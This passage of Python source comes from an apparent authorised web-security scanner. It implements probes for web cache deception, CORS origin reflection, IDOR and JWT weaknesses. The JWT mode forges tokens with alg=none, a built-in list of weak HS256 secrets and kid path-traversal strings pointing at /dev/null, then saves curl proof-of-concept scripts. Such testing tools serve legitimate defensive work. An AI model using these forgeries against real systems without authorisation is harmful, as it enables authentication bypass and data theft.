# to a dynamic, non-static URL and getting the SAME dynamic content back is
# the routing-confusion half of the bug (Omer Gil's original research and
# the well-known variants since); the exploitable half needs a cache layer
# willing to store that response under the deceptive URL, which is why this
# check also inspects Cache-Control before ever calling it confirmed — a
# response explicitly marked no-store/private is routing-confused but not
# actually cacheable, and reporting that as a critical finding would
# overstate real risk. Genuinely uncertain when Cache-Control is silent
# (several real CDNs cache by file-extension heuristic regardless of what
# the origin sends, a detail this tool can't see from outside), so that
# case is reported as an honest lead rather than a confirmed finding — the
# same "confirmed content match vs. honest lead" tiering this file already
# uses for SSRF's cloud-metadata signal and the smuggling check.
# ---------------------------------------------------------------------------

_CACHE_DECEPTION_STATIC_EXT_RE = re.compile(
    r"\.(css|js|mjs|png|jpe?g|gif|ico|svg|webp|woff2?|ttf|eot|map|txt|json|pdf)$", re.I
)
_CACHE_DECEPTION_CACHEABLE_RE = re.compile(r"\bpublic\b|\bmax-age\s*=\s*[1-9]", re.I)
_CACHE_DECEPTION_UNCACHEABLE_RE = re.compile(r"\bno-store\b|\bprivate\b|\bmax-age\s*=\s*0\b", re.I)


def _test_cache_deception(ctx, target_url, baseline):
    parts = urlsplit(target_url)
    if _CACHE_DECEPTION_STATIC_EXT_RE.search(parts.path):
        return  # already a real static-asset path — not a deception target
    # Scoped to HTML pages — the classic web cache deception scenario is a
    # personalized HTML page cached and served to other users. Plain JSON/
    # text API endpoints are a different, less classically-described risk,
    # and skipping them cuts a real source of noise: a target whose
    # non-HTML endpoint happens to return byte-identical content for any
    # path (a bare health-check responder, for instance — found directly
    # against this project's own raw-socket smuggling demo, which returns
    # a fixed "OK" text/plain body regardless of path) would otherwise
    # produce a technically-true but low-value "routing confusion" lead on
    # a target that was never a meaningful subject for this check. The
    # same reasoning also applies to a real SPA's client-side-routed shell
    # (deliberately identical HTML for every route, a normal pattern, not
    # a bug) — this gate doesn't fully solve that case, but scoping to
    # HTML at least keeps the check aimed at what it's actually meant to
    # find.
    content_type = baseline["headers"].get("Content-Type", "")
    if "html" not in content_type.lower():
        return
    budget, delay, timeout = ctx.budget, ctx.delay, ctx.timeout

    # Two classic, independent path-confusion techniques: an extra path
    # SEGMENT after a trailing static-looking filename (works against
    # servers/frameworks that greedily match a route prefix and ignore
    # anything after it), and a path-PARAMETER (;foo) suffix (works
    # against servers that strip ;params before routing internally, but
    # leave them in the raw path a downstream cache keys on verbatim).
    base_path = parts.path.rstrip("/") or "/"
    candidates = [
        base_path + "/hakuza-cache-deception-probe.css",
        base_path + ";hakuza-cache-deception-probe.css",
    ]
    for suffix_path in candidates:
        if budget.exhausted():
            return
        mutated_url = urlunsplit((parts.scheme, parts.netloc, suffix_path, parts.query, parts.fragment))
        time.sleep(delay)
        budget.spend()
        try:
            resp = requests.get(mutated_url, timeout=timeout, headers=_UA_HEADERS)
        except Exception:
            continue
        if resp.status_code != 200:
            continue  # a real 404/redirect here means routing is NOT confused — correct behavior

        body = resp.text or ""
        similarity = difflib.SequenceMatcher(None, baseline["body"], body).ratio()
        if similarity < 0.95:
            continue  # genuinely different content — not routing confusion

        cc = resp.headers.get("Cache-Control", "")
        uncacheable = bool(_CACHE_DECEPTION_UNCACHEABLE_RE.search(cc))
        cacheable = bool(_CACHE_DECEPTION_CACHEABLE_RE.search(cc)) and not uncacheable

        if uncacheable:
            # An explicit no-store/private/max-age=0 is a genuine, working
            # safety control — nearly every real cache (browser, CDN,
            # reverse proxy) respects an explicit directive like this, as
            # opposed to the genuinely ambiguous "no Cache-Control at all"
            # case below (where several real CDNs fall back to caching by
            # file-extension heuristic regardless of origin headers). The
            # routing confusion technically still exists here, but
            # reporting a "needs manual confirmation" finding against a
            # response that explicitly forbids caching would overstate
            # real risk — so this specific candidate is silently skipped,
            # not reported at any severity.
            continue

        if cacheable:
            _persist(
                ctx,
                title="Web Cache Deception — routing confusion + cacheable response",
                severity="high",
                category="Web Cache Deception",
                url=mutated_url, param="(path suffix, not a query parameter)",
                payload=suffix_path,
                description=(
                    f"Appending a fake static filename to this URL's path "
                    f"('{suffix_path}') returned the SAME dynamic content as the real "
                    f"page ({similarity:.2f} similarity) — the server routes the "
                    f"static-looking path to the same dynamic handler, a routing-"
                    f"confusion bug — AND the response carries an explicitly cacheable "
                    f"Cache-Control ('{cc}'). If a CDN, reverse proxy, or any shared "
                    f"cache sits in front of this application, it may store this "
                    f"response under the deceptive URL and serve it to every "
                    f"subsequent visitor who requests that same path — including any "
                    f"session-specific or personalized content this page happens to "
                    f"contain for the user whose request got cached."
                ),
                baseline_snippet=_ctx_snippet(baseline["body"], ""),
                mutated_snippet=_ctx_snippet(body, "", maxlen=500),
                impact=("Any personalized or session-scoped content this page returns "
                       "for one user becomes visible to every subsequent visitor of the "
                       "same deceptive URL, for as long as the cache entry lives — a "
                       "real, well-documented technique behind numerous bug bounty "
                       "disclosures on exactly this class of routing bug."),
                remediation=("Configure routing to reject unrecognized trailing path "
                            "segments and path-parameters with a real 404 rather than "
                            "falling through to a catch-all handler, and set explicit "
                            "Cache-Control: no-store (or private) on every response that "
                            "can contain per-user content, regardless of URL shape."),
            )
            return
        else:
            ctx.console.print(
                f"  [yellow]Routing confusion found on {_rich_escape(mutated_url)} "
                f"({similarity:.2f} similarity to the real page), but Cache-Control "
                f"('{_rich_escape(cc) or '(not set)'}') doesn't explicitly indicate this "
                f"response would be cached — reporting as a lead, not a confirmed "
                f"finding, since some CDNs cache by file-extension heuristic "
                f"regardless of what the origin sends, a detail this tool can't "
                f"observe from outside.[/yellow]"
            )
            _persist(
                ctx,
                title="Potential Web Cache Deception (routing confusion) — needs manual confirmation",
                severity="medium",
                category="Web Cache Deception",
                url=mutated_url, param="(path suffix, not a query parameter)",
                payload=suffix_path,
                description=(
                    f"Appending a fake static filename to this URL's path "
                    f"('{suffix_path}') returned the SAME dynamic content as the real "
                    f"page ({similarity:.2f} similarity) — a routing-confusion bug. "
                    f"Cache-Control ('{cc or '(not set)'}') doesn't explicitly mark this "
                    f"response cacheable, so whether it's actually exploitable depends "
                    f"on any caching infrastructure in front of this application "
                    f"(several real CDNs cache by file-extension heuristic regardless "
                    f"of origin headers) — this is a differential-analysis LEAD, not "
                    f"yet fully confirmed, manual verification against the real "
                    f"deployment's caching layer recommended."
                ),
                baseline_snippet=_ctx_snippet(baseline["body"], ""),
                mutated_snippet=_ctx_snippet(body, "", maxlen=500),
                impact=("If any caching layer in front of this application caches by "
                       "file-extension heuristic (common on several real CDNs, "
                       "independent of Cache-Control), the same risk as a confirmed "
                       "finding applies: personalized content cached under a "
                       "deceptive URL becomes visible to every subsequent visitor."),
                remediation=("Configure routing to reject unrecognized trailing path "
                            "segments and path-parameters with a real 404 rather than "
                            "falling through to a catch-all handler, and set explicit "
                            "Cache-Control: no-store (or private) on every response that "
                            "can contain per-user content, regardless of URL shape."),
            )
            return


def _test_cors(ctx, target_url):
    """Two real cross-origin requests: an attacker-controlled Origin, and
    the `null` origin (sent by sandboxed iframes, some sandboxed redirects,
    and file:// pages) — checking whether the server reflects either back
    in Access-Control-Allow-Origin. Reflecting an arbitrary origin is bad on
    its own; reflecting it AND setting Access-Control-Allow-Credentials:
    true is the genuinely dangerous combination — it means any malicious
    page can read this API's responses (including session-scoped data) from
    a logged-in victim's browser."""
    budget, delay, timeout = ctx.budget, ctx.delay, ctx.timeout

    def _probe(origin_value):
        if budget.exhausted():
            return None
        time.sleep(delay)
        budget.spend()
        try:
            return requests.get(target_url, timeout=timeout, allow_redirects=True,
                                headers={**_UA_HEADERS, "Origin": origin_value})
        except Exception:
            return None

    canary_origin = "https://hakuza-cors-canary.invalid"
    resp = _probe(canary_origin)
    if resp is not None:
        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower() == "true"
        if acao == canary_origin:
            severity = "critical" if acac else "high"
            _persist(
                ctx,
                title="CORS misconfiguration — arbitrary Origin reflected"
                     + (" with credentials allowed" if acac else ""),
                severity=severity,
                category="CORS Misconfiguration",
                url=target_url, param="Origin header", payload=canary_origin,
                description=(
                    f"Sending an arbitrary, attacker-controlled Origin header "
                    f"({canary_origin}) caused the server to reflect it back verbatim in "
                    f"Access-Control-Allow-Origin"
                    + (
                        ", AND Access-Control-Allow-Credentials: true was also present — "
                        "meaning any malicious page can make credentialed cross-origin "
                        "requests to this endpoint and read the response, as any logged-in "
                        "victim who visits it."
                        if acac else
                        " (Access-Control-Allow-Credentials was not set, which limits — but "
                        "does not eliminate — real-world impact: non-credentialed sensitive "
                        "data is still exposed to any origin)."
                    )
                ),
                baseline_snippet="N/A (header-only check, no body comparison)",
                mutated_snippet=(f"Access-Control-Allow-Origin: {acao}\n"
                                 f"Access-Control-Allow-Credentials: {acac}"),
                impact=("Any website a victim visits can make authenticated requests to this "
                       "endpoint on the victim's behalf and read the response — full "
                       "cross-origin data theft if the endpoint returns anything "
                       "session-scoped."
                       if acac else
                       "Any website can read this endpoint's response cross-origin. Impact "
                       "depends on what the endpoint returns without authentication."),
                remediation=("Never reflect the Origin header verbatim. Validate against an "
                            "explicit allow-list of trusted origins server-side, and never "
                            "combine a wildcard/reflected origin with "
                            "Access-Control-Allow-Credentials: true."),
                custom_poc_script=_gen_header_poc(
                    target_url, "CORS Misconfiguration", {"Origin": canary_origin}, True,
                    "Access-Control-Allow-Origin", "equals", canary_origin,
                ),
            )
            return  # one CORS finding per target is enough signal

    if budget.exhausted():
        return
    resp_null = _probe("null")
    if resp_null is not None:
        acao = resp_null.headers.get("Access-Control-Allow-Origin", "")
        acac = resp_null.headers.get("Access-Control-Allow-Credentials", "").lower() == "true"
        if acao == "null":
            _persist(
                ctx,
                title="CORS misconfiguration — 'null' Origin accepted",
                severity="high" if acac else "medium",
                category="CORS Misconfiguration",
                url=target_url, param="Origin header", payload="null",
                description=(
                    "Sending Origin: null (sent by sandboxed iframes, some sandboxed "
                    "redirects, and local file:// pages — all attacker-reachable contexts) "
                    "caused the server to set Access-Control-Allow-Origin: null" +
                    (", with credentials allowed." if acac else ".")
                ),
                baseline_snippet="N/A (header-only check, no body comparison)",
                mutated_snippet=(f"Access-Control-Allow-Origin: {acao}\n"
                                 f"Access-Control-Allow-Credentials: {acac}"),
                impact=("An attacker can reach the 'null' origin trivially (a sandboxed "
                       "iframe with no allow-same-origin, for example) and make cross-origin "
                       "requests that the browser treats as permitted."),
                remediation=("Never special-case or accept the literal string 'null' as a "
                            "trusted Origin value."),
                custom_poc_script=_gen_header_poc(
                    target_url, "CORS Misconfiguration", {"Origin": "null"}, True,
                    "Access-Control-Allow-Origin", "equals", "null",
                ),
            )
            return

    if budget.exhausted():
        return
    # Third probe: subdomain-prefix confusion. The two probes above only
    # ever catch a target that reflects a COMPLETELY arbitrary origin —
    # the wide-open case. A validator that actually tries to restrict
    # Origin to "this app's own host" but does it with a naive
    # origin.startswith("https://" + trusted_host) check (real, common)
    # instead of properly parsing and comparing the resolved host is
    # defeated by an attacker registering ANY domain that happens to
    # start with the trusted host as a literal string prefix — here,
    # {trusted_host}.hakuza-cors-canary.invalid, a subdomain of an
    # attacker-owned domain, genuinely registrable by anyone, not a
    # hypothetical. Same "confirmed content match" certainty as the two
    # probes above (Access-Control-Allow-Origin echoing this exact,
    # unique value back), just a different, more targeted delivery.
    # A realistic same-origin validator almost certainly checks against
    # whatever scheme the app is actually served over, not a hardcoded
    # one — use the target's own scheme, not an assumed https://.
    target_parts = urlsplit(target_url)
    trusted_host = target_parts.netloc
    prefix_bypass_origin = f"{target_parts.scheme}://{trusted_host}.hakuza-cors-canary.invalid"
    resp_prefix = _probe(prefix_bypass_origin)
    if resp_prefix is not None:
        acao = resp_prefix.headers.get("Access-Control-Allow-Origin", "")
        acac = resp_prefix.headers.get("Access-Control-Allow-Credentials", "").lower() == "true"
        if acao == prefix_bypass_origin:
            _persist(
                ctx,
                title="CORS misconfiguration — subdomain-prefix validation bypass",
                severity="critical" if acac else "high",
                category="CORS Misconfiguration",
                url=target_url, param="Origin header", payload=prefix_bypass_origin,
                description=(
                    f"Sending Origin: {prefix_bypass_origin} — a domain that merely "
                    f"STARTS WITH this app's own trusted host as a literal string "
                    f"prefix, but is otherwise a completely attacker-registrable domain "
                    f"— caused the server to reflect it back verbatim in "
                    f"Access-Control-Allow-Origin. Consistent with a validator checking "
                    f"origin.startswith(trusted_origin) instead of properly parsing and "
                    f"comparing the Origin header's actual resolved host: unlike the "
                    f"fully-arbitrary-origin probe, a plain unrelated origin was "
                    f"correctly rejected here, but this specific prefix-shaped one was "
                    f"not."
                    + (
                        " Access-Control-Allow-Credentials: true was also present."
                        if acac else ""
                    )
                ),
                baseline_snippet="N/A (header-only check, no body comparison)",
                mutated_snippet=(f"Access-Control-Allow-Origin: {acao}\n"
                                 f"Access-Control-Allow-Credentials: {acac}"),
                impact=("Any website registered under a domain that happens to start "
                       "with this app's own hostname as a string — trivially "
                       "achievable by any attacker — can make cross-origin requests "
                       "this validator believes are trusted."
                       + (" Combined with credentials allowed, this is full "
                          "cross-origin data theft from any logged-in victim." if acac else "")),
                remediation=("Never validate Origin with a string prefix/suffix check. "
                            "Parse the Origin header as a URL and compare its scheme and "
                            "host exactly against an explicit allow-list."),
                custom_poc_script=_gen_header_poc(
                    target_url, "CORS Misconfiguration", {"Origin": prefix_bypass_origin}, True,
                    "Access-Control-Allow-Origin", "equals", prefix_bypass_origin,
                ),
            )


def _test_idor_heuristic(ctx, parts, baseline):
    m, kind = _detect_path_id(parts.path)
    if m is None:
        return
    budget = ctx.budget
    orig_id_str = m.group(1)

    if kind == "numeric":
        orig_id = int(orig_id_str)
        # A small, bounded spread in BOTH directions rather than a single
        # -1/+1000 pair — real adjacent records are just as often the
        # immediately-neighboring ID as a far-off one, and the previous
        # two-candidate list meant an IDOR one or two records away (the
        # single most common real-world shape: another user who signed up
        # right before/after the account under test) had roughly even odds
        # of being missed entirely. Same "small bounded list, not a spray"
        # discipline already used for default credentials/JWT weak
        # secrets/K8s probe paths elsewhere in this file -- still capped at
        # a handful of requests, still exits on the first confirmed lead.
        offsets = (-5, -2, -1, 1, 2, 5, 10, 100, 1000)
        variants = [str(orig_id + off) for off in offsets if orig_id + off >= 0]

        for variant in variants:
            if variant == orig_id_str or budget.exhausted():
                continue
            new_path = parts.path[:m.start(1)] + variant + parts.path[m.end(1):]
            new_url = urlunsplit((parts.scheme, parts.netloc, new_path, parts.query, parts.fragment))
            source_note = f"Changing the numeric path segment from {orig_id_str} to {variant}."
            if _idor_try_variant(ctx, baseline, orig_id_str, variant, new_url, source_note):
                return  # one lead per target is enough signal

    else:  # uuid / hashid — guessing is futile, use real sibling IDs from recon data
        siblings = _find_sibling_ids(ctx, parts, m.start(1), m.end(1), orig_id_str)
        if not siblings:
            ctx.console.print(
                f"  [dim]path ID looks like a {kind} ({_rich_escape(orig_id_str)}) — no "
                f"sibling values found in this engagement's recon data to cross-reference, "
                f"skipping (guessing a {kind} is not viable).[/dim]"
            )
            return

        label = "UUID" if kind == "uuid" else "hashid"
        for variant in siblings:
            if budget.exhausted():
                return
            new_path = parts.path[:m.start(1)] + variant + parts.path[m.end(1):]
            new_url = urlunsplit((parts.scheme, parts.netloc, new_path, parts.query, parts.fragment))
            source_note = (
                f"Requesting a different {label} ({variant}) discovered elsewhere in this "
                f"engagement's own recon data (same URL template, different ID — not a guess) "
                f"in place of {orig_id_str}."
            )
            if _idor_try_variant(ctx, baseline, orig_id_str, variant, new_url, source_note):
                return  # one lead per target is enough signal


# ---------------------------------------------------------------------------
# --script / --ai-script modes
# ---------------------------------------------------------------------------

def _show_script_result(console, eng, result):
    Panel, Rule, Table, Prompt, Confirm, Syntax, box = _rich()
    stdout = result.get("stdout", "") or ""
    stderr = result.get("stderr", "") or ""
    rc = result.get("returncode")
    timed_out = result.get("timed_out", False)

    console.print(Rule("[bold]stdout[/bold]", style="dim"))
    console.print(_rich_escape(stdout[:5000]) if stdout.strip() else "[dim](empty)[/dim]")
    if stderr.strip():
        console.print(Rule("[bold red]stderr[/bold red]", style="red"))
        console.print(f"[red]{_rich_escape(stderr[:3000])}[/red]")
    console.print(f"\n[bold]Return code:[/bold] {rc}" +
                 ("  [red](timed out)[/red]" if timed_out else ""))

    finding_json = None
    for line in stdout.splitlines():
        if line.startswith("HAKUZA_FINDING:"):
            raw = line[len("HAKUZA_FINDING:"):].strip()
            try:
                finding_json = json.loads(raw)
            except json.JSONDecodeError:
                console.print("[yellow]Found a HAKUZA_FINDING: line but could not parse it as JSON.[/yellow]")
            break

    if finding_json:
        console.print(Panel(_rich_escape(json.dumps(finding_json, indent=2)),
                            title="Parsed finding", border_style="green", expand=False))
        try:
            if Confirm.ask("Persist this as a real finding in the engagement DB?", default=True):
                f = _add_finding(
                    eng["id"],
                    title=finding_json.get("title", "Custom script finding"),
                    severity=finding_json.get("severity", "informational"),
                    description=finding_json.get("description", ""),
                    tool="hakuza-active-script",
                )
                console.print(f"[green]Saved as [{f['short_id']}][/green]")
        except EOFError:
            console.print("[dim]Non-interactive stdin — skipping persistence prompt.[/dim]")


def _run_script_mode(args, console, eng):
    Panel, Rule, Table, Prompt, Confirm, Syntax, box = _rich()
    if not HAS_ACTIVE_AI:
        console.print("[red]--script requires mod_active_ai.py (run_custom_script), which is "
                      "not available.[/red]")
        return
    path = Path(getattr(args, "script"))
    if not path.exists():
        console.print(f"[red]Script not found:[/red] {_rich_escape(str(path))}")
        return
    console.print(Panel(f"Running: {_rich_escape(str(path))}", title="hakuza active --script",
                        border_style="cyan", expand=False))
    result = run_custom_script(str(path), timeout=30)
    _show_script_result(console, eng, result)


# ---------------------------------------------------------------------------
# JWT testing (--jwt TOKEN) — a real token supplied by the operator, not
# discovered automatically. Unlike every other check in this file, the
# engine has no login flow of its own to obtain a session token from, so
# this is an explicit mode like --script/--ai-script rather than an
# automatic per-target check.
# ---------------------------------------------------------------------------

_JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "changeme", "supersecret",
    "jwt_secret", "your-256-bit-secret", "admin", "secret123", "test",
]  # "your-256-bit-secret" is jwt.io's own example secret in its docs —
   # left unchanged by developers who copy-paste from there often enough
   # to be worth a dedicated entry, not just a generic guess.


def _b64url_decode(segment):
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def _b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _jwt_parse(token):
    """Decode header+payload without verifying anything — reading the
    claims needs no signature check, that's the whole reason a compact JWT
    can be decoded client-side. Returns (header, payload) dicts."""
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError("not enough '.'-separated segments to be a JWT")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    return header, payload


def _jwt_forge_none(payload):
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def _jwt_forge_hs256(payload, secret):
    header = {"alg": "HS256", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


# kid path-traversal targets: if a verifier naively builds a filesystem
# path from the token's own "kid" header to look up the signing key (a
# real, well-documented JWT implementation bug), pointing kid at a
# predictable file — classically /dev/null, which always reads as zero
# bytes — lets an attacker sign with a KNOWN secret (empty bytes) instead
# of the real one. Several traversal depths and one filter-bypass variant
# are tried since the real key-lookup directory's depth is unknown.
_JWT_KID_NULL_CANDIDATES = [
    "../../../../../../../../dev/null",
    "../../../../dev/null",
    "../../dev/null",
    "....//....//....//....//dev/null",
]

# Stripped out of response bodies before similarity-diffing in
# _run_jwt_mode's _looks_authenticated — routine per-response dynamic
# content (a request timestamp, a nonce, a regenerated session id) sits
# right next to the fixed 0.7/0.95 similarity cutoffs and can push a
# genuinely-identical-outcome comparison either side of them.
_JWT_ISO_TS_RE = re.compile(
    r"\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?"
)
_JWT_LONG_TOKEN_RE = re.compile(r"\b[0-9a-f]{16,}\b|\b[A-Za-z0-9_-]{24,}\b")


def _jwt_forge_hs256_kid(payload, kid, secret_bytes):
    header = {"alg": "HS256", "typ": "JWT", "kid": kid}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret_bytes, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def _run_jwt_mode(args, console, eng, jwt_token):
    Panel, Rule, Table, Prompt, Confirm, Syntax, box = _rich()
    if not HAS_REQUESTS:
        console.print("[red]--jwt sends live HTTP requests and requires the 'requests' "
                      "library.[/red]")
        return

    target_url = getattr(args, "target", None) or eng.get("target")
    if not target_url:
        console.print("[red]No target URL — pass one positionally along with --jwt, e.g. "
                      "hakuza active \"https://target.tld/api/profile\" --jwt eyJ...[/red]")
        return

    # This mode bypasses cmd_active's normal target-resolution path entirely
    # (it returns before _resolve_targets/_apply_scope_guard ever run), so
    # the scope check has to happen here explicitly — every other target in
    # this file gets scope-gated, --jwt is not exempt just because it takes
    # its target from a flag instead of the positional/--all path.
    in_scope = _apply_scope_guard([target_url], console, eng)
    if not in_scope:
        console.print("[red]Target is out of this engagement's defined scope — refusing to "
                      "test it. Use `hakuza scope` to review/adjust scope entries.[/red]")
        return

    try:
        header, payload = _jwt_parse(jwt_token)
    except Exception as e:
        console.print(f"[red]Could not parse the supplied token as a JWT: "
                      f"{_rich_escape(str(e))}[/red]")
        return

    console.print(Panel(
        f"[bold]Header:[/bold]  {_rich_escape(json.dumps(header))}\n"
        f"[bold]Payload:[/bold] {_rich_escape(json.dumps(payload))}",
        title="hakuza active --jwt — parsed token", border_style="cyan", expand=False,
    ))

    timeout = getattr(args, "timeout", 10) or 10
    delay = getattr(args, "delay", 0.15) or 0.15
    max_requests = getattr(args, "max_requests", 300) or 300
    budget = _RequestBudget(max_requests)

    # Every other live-request path in this file is budget-aware and
    # rate-limited (see _polite_get) — --jwt can fire up to ~17 requests
    # (real token, unauthenticated baseline, alg=none, up to 10 weak-secret
    # guesses, up to 4 kid-traversal candidates) and had neither, until this
    # fix.
    def _try_token(token):
        if budget.exhausted():
            return None
        time.sleep(delay)
        budget.spend()
        try:
            return requests.get(target_url, timeout=timeout,
                                headers={**_UA_HEADERS, "Authorization": f"Bearer {token}"})
        except Exception:
            return None

    # Real-vs-forged / real-vs-unauth diffing below is a similarity RATIO
    # against the whole body, unlike the IDOR heuristic's per-chunk noise
    # filtering — so routine dynamic content (a request timestamp, a nonce,
    # a session id regenerated per response) can silently drag the ratio in
    # either direction: down below the 0.7 "accepted" cutoff for a truly
    # accepted forged token sitting next to unrelated dynamic noise, or up
    # past the 0.95 "endpoint doesn't check auth at all" cutoff on an
    # endpoint that actually does gate correctly but just has enough
    # shared static boilerplate around a small dynamic span. Normalizing
    # obviously-dynamic spans out before diffing (same idea as
    # _IDOR_NOISE_LABEL_RE/_IDOR_RANDOM_TOKEN_RE above, applied to whole
    # bodies instead of per-chunk context) makes both thresholds compare
    # what's actually meaningful.
    def _normalize_dynamic(text):
        text = _JWT_ISO_TS_RE.sub("HKZTS", text or "")
        return _JWT_LONG_TOKEN_RE.sub("HKZTOK", text)

    resp_real = _try_token(jwt_token)
    if resp_real is None:
        console.print("[red]Could not reach the target with the real token — aborting.[/red]")
        return
    real_body = resp_real.text or ""
    real_body_norm = _normalize_dynamic(real_body)

    try:
        time.sleep(delay)
        budget.spend()
        resp_unauth = requests.get(target_url, timeout=timeout, headers=_UA_HEADERS)
        unauth_body = resp_unauth.text or ""
        unauth_body_norm = _normalize_dynamic(unauth_body)
        unauth_status = resp_unauth.status_code
    except Exception:
        unauth_body, unauth_body_norm, unauth_status = "", "", None

    # If a request with NO token at all already looks the same as the real,
    # genuinely-authenticated one, this endpoint isn't gating on the token
    # in the first place — there's nothing for a forged token to "bypass".
    # Reporting one here would be a false claim, not a real finding
    # (confirmed as a real failure mode directly: testlab's own
    # /api/account doesn't check Authorization at all, and without this
    # guard both JWT checks below false-positived against it).
    if unauth_status == resp_real.status_code:
        baseline_vs_unauth = difflib.SequenceMatcher(None, real_body_norm, unauth_body_norm).ratio()
        if baseline_vs_unauth > 0.95:
            console.print(
                "[yellow]A request with NO Authorization header at all already looks "
                "identical to the request with your real token — this endpoint doesn't "
                "appear to enforce authentication via this token at all, so there's "
                "nothing for a forged token to bypass. Skipping alg=none/weak-secret "
                "checks (they would be meaningless here, not evidence of anything).[/yellow]"
            )
            return

    def _looks_authenticated(resp):
        """A forged token's response is treated as "accepted" only if it
        resembles the REAL authenticated response more than it resembles
        the unauthenticated one — not just "got a 200", since plenty of
        apps return 200 with a login page for unauthenticated requests
        too."""
        if resp is None or resp.status_code >= 400:
            return False
        body = resp.text or ""
        if _DENIAL_PHRASE_RE.search(body):
            return False
        body_norm = _normalize_dynamic(body)
        ratio_real = difflib.SequenceMatcher(None, real_body_norm, body_norm).ratio()
        ratio_unauth = (
            difflib.SequenceMatcher(None, unauth_body_norm, body_norm).ratio() if unauth_body_norm else 0.0
        )
        return ratio_real > 0.7 and ratio_real >= ratio_unauth

    findings = []

    none_token = _jwt_forge_none(payload)
    if _looks_authenticated(_try_token(none_token)):
        findings.append((
            "alg=none signature bypass", none_token, "critical",
            "The server accepted a JWT with the header's alg field set to \"none\" and no "
            "signature segment at all — a complete authentication bypass. Any claims "
            "(user ID, role, permissions) in the payload can be forged freely with zero "
            "cryptographic verification.",
            "Reject alg=none explicitly, or better, use a library/config that only ever "
            "accepts one specific expected algorithm rather than trusting the token's own "
            "declared alg header.",
        ))

    cracked_secret = None
    for secret in _JWT_WEAK_SECRETS:
        forged = _jwt_forge_hs256(payload, secret)
        if _looks_authenticated(_try_token(forged)):
            cracked_secret = secret
            findings.append((
                f"weak HS256 signing secret ('{secret}')", forged, "critical",
                f"The JWT's HS256 signature was forgeable using a common weak secret "
                f"('{secret}') from a small built-in list ({len(_JWT_WEAK_SECRETS)} tried) — "
                f"complete signature forgery, any claims can be set arbitrarily.",
                "Use a genuinely random, high-entropy secret (32+ bytes from a real CSPRNG), "
                "generated per-deployment, never a memorable word or the value from a "
                "tutorial/example.",
            ))
            break  # one cracked secret is enough evidence

    if not cracked_secret:
        for candidate in _JWT_KID_NULL_CANDIDATES:
            forged = _jwt_forge_hs256_kid(payload, candidate, b"")
            if _looks_authenticated(_try_token(forged)):
                findings.append((
                    f"kid header path traversal ('{candidate}')", forged, "critical",
                    f"Setting the JWT header's \"kid\" field to a path-traversal string "
                    f"('{candidate}') and signing with an empty-bytes secret was accepted — "
                    f"consistent with the verifier building a filesystem path directly from "
                    f"the token's own kid header to look up the signing key, with no "
                    f"containment check, letting the traversal reach a predictable "
                    f"zero-byte file (classically /dev/null) whose content is a known, "
                    f"guessable \"secret\".",
                    "Never build a filesystem path (or any lookup key) directly from a "
                    "client-supplied JWT header. Validate kid against an allow-list of known "
                    "key identifiers server-side before using it for anything.",
                ))
                break  # one accepted traversal candidate is enough evidence

    if not findings:
        console.print("[green]No alg=none bypass, weak-secret match, or kid path-traversal "
                      "acceptance found. This does not mean the JWT implementation is secure "
                      "— only that these specific, fast checks didn't find anything.[/green]")
        return

    for title_suffix, forged_token, severity, description, remediation in findings:
        console.print(f"  [bold red]CONFIRMED[/bold red] JWT: {_rich_escape(title_suffix)}")
        finding = _add_finding(
            eng["id"],
            title=f"JWT — {title_suffix}",
            severity=severity,
            category="JWT Authentication Bypass",
            url=target_url,
            description=(
                description +
                "\n\nVerified live: the forged token was sent to the real target and the "
                "response matched the genuinely-authenticated baseline, not the "
                "unauthenticated one."
            ),
            evidence=f"Forged token:\n{forged_token}\n\nOriginal payload:\n{json.dumps(payload, indent=2)}",
            impact="Full authentication bypass — arbitrary claims (user ID, role, permissions) can be forged.",
            remediation=remediation,
            tool="hakuza-active",
        )
        console.print(f"  [dim]Saved as [{finding['short_id']}][/dim]")

        if HAS_ACTIVE_AI:
            try:
                curl_cmd = gen_curl_poc("GET", target_url, {},
                                        headers={"Authorization": f"Bearer {forged_token}"})
                artifacts_dir = _n("ENGAGEMENTS_DIR") / eng["name"] / "artifacts"
                artifacts_dir.mkdir(parents=True, exist_ok=True)
                poc_path = artifacts_dir / f"poc_{finding['short_id']}.sh"
                poc_path.write_text(f"#!/bin/sh\n{curl_cmd}\n", encoding="utf-8")
                _add_artifact(eng["id"], artifact_type="poc-script", filename=poc_path.name,
                             filepath=str(poc_path), tool="hakuza-active")
                console.print(f"  [dim]PoC:[/dim] {poc_path}")
            except Exception as e:
                console.print(f"  [dim]PoC generation failed: {_rich_escape(str(e))}[/dim]")


def _run_ai_script_mode(args, console, eng, description):
    Panel, Rule, Table, Prompt, Confirm, Syntax, box = _rich()
    if not HAS_ACTIVE_AI:
        console.print("[red]--ai-script requires mod_active_ai.py (draft_ai_test_script), which "
                      "is not available.[/red]")
        return
    client = _get_client_or_none()
    if not client:
        console.print("[red]No Anthropic API key configured — set ANTHROPIC_API_KEY or "
                      "`hakuza config --set api_key=...`.[/red]")
        return

    target_url = getattr(args, "target", None) or eng["target"]
    engagement_context = f"Target: {eng.get('target')} | Client: {eng.get('client')} | Type: {eng.get('type')}"

    console.print(Panel(
        f"Asking Claude to draft a test script for:\n[bold]{_rich_escape(description)}[/bold]\n"
        f"Against: {_rich_escape(target_url)}",
